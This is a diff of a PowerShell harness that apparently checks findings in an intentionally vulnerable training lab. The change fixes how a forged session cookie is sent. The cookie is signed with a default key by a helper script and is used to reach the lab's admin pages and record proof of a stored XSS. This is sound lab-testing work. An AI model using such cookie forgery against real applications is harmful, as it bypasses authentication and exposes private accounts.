@@ -29,11 +29,12 @@ $python = Join-Path $RepositoryPath ".venv\Scripts\python.exe"
 function Invoke-Lab {
     <# Returns the response body as a string, including for 4xx/5xx responses. #>
     param([string]$Path, [string]$Method = "GET", $Body = $null,
-          [string]$ContentType = "application/json", [hashtable]$Headers = @{})
+          [string]$ContentType = "application/json", [hashtable]$Headers = @{},
+          $WebSession = $script:session)
     $Headers["X-Lab-Test-ID"] = $TestId
     $uri = if ($Path -match '^https?://') { $Path } else { "$BaseUrl$Path" }
     try {
-        $arguments = @{ Uri = $uri; Method = $Method; WebSession = $session
+        $arguments = @{ Uri = $uri; Method = $Method; WebSession = $WebSession
                         Headers = $Headers; UseBasicParsing = $true; TimeoutSec = 20 }
         if ($null -ne $Body) { $arguments.Body = $Body; $arguments.ContentType = $ContentType }
         return (Invoke-WebRequest @arguments).Content
@@ -174,10 +175,20 @@ Record "reset-token" (Get-Proof (Invoke-Lab -Path "/api/v1/account/reset" -Metho
 if (Test-Path $python) {
     $secret = if ($env:LAB_SESSION_SECRET) { $env:LAB_SESSION_SECRET } else { "meridian-default-signing-key" }
     $forgedCookie = & $python (Join-Path $RepositoryPath "tools\forge_session.py") --secret $secret
+
+    # The forged cookie needs its own session. Invoke-WebRequest lets a
+    # WebSession's cookie container win over a manually set Cookie header, and
+    # $script:session already holds a real portal cookie from the login checks
+    # above - reusing it would silently send that one and the staff area would
+    # answer 403.
+    $forgedSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+    $forgedSession.Cookies.Add((New-Object System.Net.Cookie(
+        "session", $forgedCookie, "/", ([Uri]$BaseUrl).Host)))
+
     Record "weak-session-secret" (Get-Proof (Invoke-Lab -Path "/admin" `
-        -Headers @{ Cookie = "session=$forgedCookie" }))
+        -WebSession $forgedSession))
     Record "xss-stored" (Get-ProofFromBase64 (Invoke-Lab -Path "/admin/messages" `
-        -Headers @{ Cookie = "session=$forgedCookie" }))
+        -WebSession $forgedSession))
 } else {
     foreach ($id in @("weak-session-secret", "xss-stored")) {
         Write-Host ("  SKIP {0,-22} .venv not found at {1}" -f $id, $python) -ForegroundColor Yellow
